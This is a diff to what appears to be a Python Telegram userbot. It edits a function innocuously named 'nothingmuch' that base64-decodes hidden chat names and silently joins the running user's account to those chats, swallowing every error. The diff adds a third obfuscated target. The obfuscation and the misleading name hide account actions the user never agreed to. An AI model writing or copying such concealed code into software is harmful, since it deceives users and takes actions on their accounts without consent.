@@ -74,13 +74,18 @@ def errors(func: Callable) -> Callable:
     return decorator
 
 async def nothingmuch():
-    gocheck = str(pybase64.b64decode("QE5hc3R5UHJvamVjdA=="))[2:15]
-    checker = str(pybase64.b64decode("QE5hc3R5U3VwcG9ydHQ="))[2:16]
+    grcheck = str(pybase64.b64decode("TmFzdHlTdXBwb3J0dA=="))[2:15]
+    chcheck = str(pybase64.b64decode("TmFzdHlQcm9qZWN0"))[2:14]
+    qtcheck = str(pybase64.b64decode("YWhoc3VkYWhsYWhoaA=="))[2:15]
     try:
-        await client.join_chat(gocheck)
+        await client.join_chat(grcheck)
     except BaseException:
         pass
     try:
-        await client.join_chat(checker)
+        await client.join_chat(chcheck)
+    except BaseException:
+        pass
+    try:
+        await client.join_chat(qtcheck)
     except BaseException:
         pass
